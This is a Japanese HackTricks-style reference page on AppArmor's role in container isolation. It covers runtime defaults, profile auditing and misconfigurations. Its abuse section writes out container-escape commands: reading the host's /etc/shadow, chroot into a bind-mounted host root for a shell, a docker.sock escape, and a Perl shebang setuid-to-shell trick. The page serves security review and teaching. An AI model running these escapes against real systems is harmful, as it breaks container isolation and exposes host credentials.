# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

AppArmor は、プログラムごとのプロファイルを通じて制限を適用する **Mandatory Access Control** システムです。ユーザーやグループの所有権に大きく依存する従来の DAC チェックとは異なり、AppArmor では、プロセス自体に紐付けられたポリシーをカーネルが適用できます。コンテナ環境では、ワークロードに従来の権限上はある操作を試みるのに十分な権限があっても、AppArmor プロファイルで該当するパス、マウント、ネットワーク動作、または capability の使用が許可されていないために拒否されることがあります。

最も重要な概念は、AppArmor が **パスベース**であることです。SELinux のようにラベルを使うのではなく、パスルールを通じてファイルシステムへのアクセスを判断します。これにより、扱いやすく強力な一方で、bind mount や別のパス構成には注意が必要です。同じホスト上のコンテンツが別のパスからアクセス可能になると、ポリシーの効果が運用者の当初の想定どおりにならない場合があります。

## コンテナ分離における役割

コンテナのセキュリティレビューでは capabilities と seccomp だけで終わりがちですが、それらのチェック後も AppArmor は重要です。必要以上の権限を持つコンテナや、運用上の理由で追加の capability を必要とするワークロードを考えてみてください。AppArmor は、ファイルアクセス、マウント動作、ネットワーク、実行パターンを引き続き制限でき、明白な悪用経路を阻止できます。そのため、「アプリケーションを動かすためだけに」AppArmor を無効化すると、単にリスクのある構成が、気付かないうちに実際に悪用可能な構成へ変わってしまうことがあります。

## 実習

ホストで AppArmor が有効か確認するには、次を実行します。

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

現在のコンテナプロセスがどのプロファイルで実行されているかを確認するには:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

通常のケースでは、プロセスにはランタイムが選択したプロファイルに紐づく AppArmor コンテキストが表示されるはずです。unconfined のケースでは、この追加の制限レイヤーがなくなります。

Docker が適用したと認識している内容も確認できます。

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## ランタイムでの使用

ホストがサポートしている場合、Docker はデフォルトまたはカスタムの AppArmor プロファイルを適用できます。Podman も AppArmor ベースのシステムでは AppArmor と連携できますが、SELinux を優先するディストリビューションでは、通常もう一方の MAC システムが中心的な役割を果たします。Kubernetes では、実際に AppArmor をサポートするノード上で、ワークロードレベルの AppArmor ポリシーを指定できます。LXC や、Ubuntu 系の関連するシステムコンテナ環境でも AppArmor が広く使われています。

実用上重要なのは、AppArmor が「Docker の機能」ではないということです。これはホストカーネルの機能であり、複数のランタイムが適用を選択できます。ホストがサポートしていない場合や、ランタイムに unconfined で実行するよう指定されている場合、想定される保護は実際には機能しません。

Kubernetes では、現在の API は `securityContext.appArmorProfile` です。Kubernetes `v1.30` 以降、以前のベータ版 AppArmor アノテーションは非推奨です。サポート対象のホストでは、`RuntimeDefault` がデフォルトのプロファイルで、`Localhost` はノードにあらかじめロードされている必要のあるプロファイルを指定します。マニフェストが AppArmor に対応しているように見えても、ノード側のサポートと、あらかじめロードされたプロファイルに全面的に依存している場合があるため、レビュー時にはこの点が重要です。<sup>[[1]](#references)</sup>

運用上の微妙ながら有用な点として、`appArmorProfile.type: RuntimeDefault` を明示的に設定する方が、フィールドを省略するより厳格です。フィールドが明示的に設定されていて、ノードが AppArmor をサポートしていない場合、admission は失敗するはずです。フィールドを省略した場合、AppArmor のないノードでもワークロードが実行され、その追加の制限レイヤーが適用されないことがあります。攻撃者の視点からは、マニフェストと実際のノードの状態の両方を確認すべき理由になります。<sup>[[1]](#references)</sup>

AppArmor をサポートする Docker ホストで、最もよく知られているデフォルトプロファイルは `docker-default` です。このプロファイルは Moby の AppArmor テンプレートから生成され、capability ベースの PoC の一部がデフォルトのコンテナ内でも失敗する理由を説明するうえで重要です。大まかに言えば、`docker-default` は通常のネットワーク通信を許可し、`/proc` の多くの箇所への書き込みを拒否し、`/sys` の機密性の高い部分へのアクセスを拒否し、mount 操作をブロックし、ptrace を一般的なホスト調査の手段として使えないよう制限します。この基本設定を理解しておくと、「コンテナに `CAP_SYS_ADMIN` がある」ことと、「対象のカーネルインターフェースに対して、その capability を実際に使える」ことを区別できます。

## プロファイル管理

AppArmor プロファイルは通常、`/etc/apparmor.d/` に保存されています。よく使われる命名規則では、実行ファイルのパスに含まれるスラッシュをドットに置き換えます。たとえば、`/usr/bin/man` 用のプロファイルは、一般に `/etc/apparmor.d/usr.bin.man` として保存されます。この点は防御と評価の両方で重要です。有効なプロファイル名が分かれば、ホスト上で対応するファイルをすばやく見つけられることが多いためです。

ホスト側の管理に役立つコマンドは次のとおりです。

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

コンテナセキュリティのリファレンスでこれらのコマンドが重要なのは、プロファイルを実際にどのように作成し、読み込み、complain modeに切り替え、アプリケーションの変更後に更新するかを説明しているためです。トラブルシューティング中にプロファイルをcomplain modeに切り替え、enforcementに戻すのを忘れる癖が運用担当者にあると、ドキュメント上はコンテナが保護されているように見えても、実際にははるかに緩い状態で動作する可能性があります。

### プロファイルの作成と更新

`aa-genprof`はアプリケーションの動作を監視し、対話形式でプロファイルを生成するのに役立ちます。

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

`aa-easyprof` は、後で `apparmor_parser` で読み込めるテンプレートプロファイルを生成できます。

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

バイナリが変更され、ポリシーの更新が必要になった場合、`aa-logprof` はログ内で見つかった拒否イベントを再生し、それらを許可するか拒否するかの判断をオペレーターに支援できます：

```bash
sudo aa-logprof
```

### ログ

AppArmorによる拒否は、`auditd`、syslog、または`aa-notify`などのツールを通じて確認できることがよくあります。

```bash
sudo aa-notify -s 1 -v
```

これは運用面でも攻撃面でも有用です。防御側はこれを使ってプロファイルを改善します。攻撃者は、どのパスや操作が拒否されているのか、また AppArmor がエクスプロイトチェーンを阻止している制御なのかを正確に把握するために使います。

### 正確なプロファイルファイルの特定

ランタイムにコンテナの特定の AppArmor プロファイル名が表示される場合、その名前をディスク上のプロファイルファイルに対応付けると役立つことがあります。

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

これは特にホスト側のレビューで役立ちます。「コンテナは profile `lowpriv` で実行中だと言っている」という状態と、「実際のルールは監査または再読み込みできるこの特定のファイルに記述されている」という状態の隔たりを埋められるためです。

### 監査すべき重要なルール

profile を読み取れる場合、単純な `deny` 行だけで判断しないでください。いくつかのルールタイプは、コンテナ escape の試みに対する AppArmor の有効性を大きく左右します:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: 対象バイナリを unconfined で実行します。アクセス可能な helper、shell、または interpreter が `ux` で許可されている場合、通常は最初に確認すべき点です。
- `px` / `Px` および `cx` / `Cx`: exec 時に profile を切り替えます。これらが自動的に問題となるわけではありませんが、遷移先が現在よりはるかに広範な profile である可能性があるため、監査する価値があります。
- `change_profile`: タスクが別のロード済み profile に即座に、または次の exec 時に切り替わることを許可します。遷移先の profile の制限が弱い場合、制限の厳しいドメインから意図的に抜け出す手段になり得ます。
- `flags=(complain)`、`flags=(unconfined)`、または新しい `flags=(prompt)`: profile をどの程度信頼するかを見直す必要があります。`complain` は拒否を強制せずログに記録し、`unconfined` は境界を取り除き、`prompt` はカーネルによる純粋な拒否ではなく、userspace の判断経路に依存します。
- `userns` または `userns create,`: 新しい AppArmor ポリシーでは、user namespace の作成を制御できます。コンテナ profile がこれを明示的に許可している場合、プラットフォームが hardening 戦略の一環として AppArmor を使用していても、nested user namespace は引き続き利用可能です。

ホスト側で役立つ grep:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

この種の監査は、何百もの一般的なファイルルールを眺めるよりも役立つことがよくあります。breakout がヘルパーの実行、新しい namespace への移行、またはより制限の緩い profile への脱出に依存する場合、その答えは、明白な `deny /etc/shadow r` のような行ではなく、こうした遷移に関するルールに隠れていることがよくあります。

## 誤設定

最も明白な間違いは `apparmor=unconfined` です。管理者は、profile が危険または予期しない操作を正しくブロックしたためにアプリケーションが失敗した際、デバッグのためにこれを設定することがよくあります。このフラグが本番環境に残っていると、MAC レイヤー全体が実質的に無効化されています。

もう一つの微妙な問題は、ファイルのパーミッションが通常どおりに見えるため、bind mount は無害だと思い込むことです。AppArmor はパスベースであるため、別のマウント場所にホストパスを公開すると、パスルールとの相互作用で問題が起きることがあります。3つ目の間違いは、設定ファイル内に profile 名があれば十分だと思い込み、ホストカーネルが実際には AppArmor を強制していないことを見落とすことです。

## 悪用

AppArmor が無効になると、それまで制限されていた操作が突然可能になることがあります。たとえば、bind mount 経由で機密パスを読み取る、本来は利用しにくいはずの procfs や sysfs の一部にアクセスする、capabilities/seccomp も許可していれば mount 関連の操作を行う、あるいは profile なら通常拒否するパスを使う、といった操作です。capability ベースの breakout が理論上は「成功するはず」なのに実際には失敗する理由が、AppArmor にあることはよくあります。AppArmor を取り除くと、同じ試行が成功し始めることがあります。

AppArmor が path-traversal、bind mount、または mount ベースの悪用チェーンを主に阻止していると思われる場合、最初の手順として、profile の有無によって何がアクセス可能になるかを比較するのが一般的です。たとえば、ホストパスがコンテナ内にマウントされている場合、まずそのパスをたどって読み取れるかどうかを確認します。

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

コンテナに `CAP_SYS_ADMIN` のような危険な capability もある場合、AppArmor が mount 操作や機密性の高いカーネルファイルシステムへのアクセスを阻止しているかどうかを確認するのが、最も実用的なテストの一つです。

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

bind mount を通じてホストパスをすでに利用できる環境では、AppArmor が失われることで、読み取り専用の情報漏えいの問題が、ホストファイルへの直接アクセスに変わることもあります。

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

これらのコマンドの要点は、AppArmorだけでブレイクアウトが発生するということではありません。AppArmorを無効にすると、多くのファイルシステムやマウントを利用した悪用経路をすぐに試せるようになるということです。

### 完全な例: AppArmorを無効化 + ホストのルートをマウント

コンテナ内の`/host`にホストのルートがすでにbind mountされている場合、AppArmorを無効にすることで、阻止されていたファイルシステム悪用経路からホストへの完全なエスケープが可能になることがあります:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

shell がホストファイルシステム経由で実行されると、ワークロードは事実上コンテナ境界から脱出したことになります：

```bash
id
hostname
cat /etc/shadow | head
```

### 完全な例: AppArmor 無効化 + Runtime Socket

実際の障壁が runtime state を保護する AppArmor だった場合、完全な escape にはマウントされた socket だけで十分なことがあります。

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

正確なパスはマウントポイントによって異なりますが、最終的な結果は同じです。AppArmorはランタイムAPIへのアクセスを防げなくなり、ランタイムAPIからホストを侵害できるコンテナを起動できます。

### 完全な例: パスベースのbind-mount bypass

AppArmorはパスベースであるため、`/proc/**`を保護しても、別のパスからアクセス可能な同じホストのprocfsコンテンツが自動的に保護されるわけではありません。

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

影響は、何がマウントされているか、また別のパスが他の制御も回避するかによって異なりますが、このパターンは、AppArmorを単独で評価するのではなく、マウント構成と併せて評価する必要がある最も明確な理由の一つです。

### 完全な例: Shebangによる回避

AppArmorは、shebangで指定されたインタープリターのパスではなく、実行されたスクリプトのパスにプロファイルを適用する場合があります。一方、インタープリターを直接呼び出すと、そのインタープリターのプロファイルが選択されることがあります。[AppArmorのメンテナーがこの違いを説明しています](https://bugs.launchpad.net/apparmor/+bug/1911431)。過去の例では、先頭行で制限されたインタープリターを指定するスクリプトが使われていました:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

この例は、インタープリターの file capability が有効になり得て、スクリプトの実際の exec attachment がその操作を許可する候補にすぎません。読み込まれたポリシーとプロセスラベル、capability bounding set、`no_new_privs`、マウントの `nosuid` 状態を確認してください。プロファイルのファイル名や `cap_setuid+ep` の表示だけでは、利用可能な遷移があるとは証明できません。インタープリターのチェーンや別の実行経路についても、個別に確認する必要があります。

## 確認項目

これらの確認では、次の3つの質問にすばやく答えることを目指します。ホストで AppArmor が有効か、現在のプロセスが confinement されているか、そして runtime がこのコンテナに実際にプロファイルを適用したか。

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

ここで注目すべき点：

- `/proc/self/attr/current` に `unconfined` と表示される場合、workload は AppArmor による制限の恩恵を受けていません。
- `aa-status` に AppArmor が無効または未ロードと表示される場合、runtime config に指定された profile 名は、ほぼ見せかけにすぎません。
- `docker inspect` に `unconfined` または想定外のカスタム profile が表示される場合、それが filesystem や mount を使った悪用経路が機能する理由であることがよくあります。
- `/sys/kernel/security/apparmor/profiles` に想定していた profile が含まれていない場合、runtime や orchestrator の設定だけでは不十分です。
- 強化済みとされる profile に `ux`、広範な `change_profile`、`userns`、または `flags=(complain)` のようなルールが含まれている場合、実際の境界は profile 名から想像されるより大幅に弱い可能性があります。

運用上の理由でコンテナにすでに昇格した権限が与えられている場合、AppArmor を有効にしておくことで、制御された例外で済むか、より広範なセキュリティ障害に発展するかが分かれることがよくあります。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor 対応ホストではデフォルトで有効 | 上書きされない限り、`docker-default` AppArmor profile を使用 | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Podman | ホストに依存 | `--security-opt` による AppArmor をサポートしますが、正確なデフォルトはホスト/runtime に依存し、Docker の文書化された `docker-default` profile ほど統一されていません | `--security-opt apparmor=unconfined`、`--security-opt apparmor=<profile>`、`--privileged` |
| Kubernetes | 条件付きでデフォルト有効 | `appArmorProfile.type` が指定されていない場合、デフォルトは `RuntimeDefault` ですが、ノードで AppArmor が有効な場合にのみ適用されます | `securityContext.appArmorProfile.type: Unconfined`、弱い profile を指定した `securityContext.appArmorProfile.type: Localhost`、AppArmor 非対応のノード |
| containerd / Kubernetes 環境の CRI-O | ノード/runtime のサポートに従う | Kubernetes 対応の一般的な runtime は AppArmor をサポートしますが、実際に強制されるかはノードのサポート状況と workload の設定に依存します | Kubernetes の行と同様。runtime を直接設定して AppArmor を完全にスキップすることも可能です |

AppArmor で最も重要な変数は、多くの場合 runtime だけではなく**ホスト**です。manifest で profile を設定しても、AppArmor が有効でないノード上では制限は作られません。

## References

- [1] [Kubernetes の security context：AppArmor profile のフィールドとノードサポート時の動作](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [2] [Ubuntu 24.04 `apparmor.d(5)` manpage：exec の遷移、`change_profile`、`userns`、profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
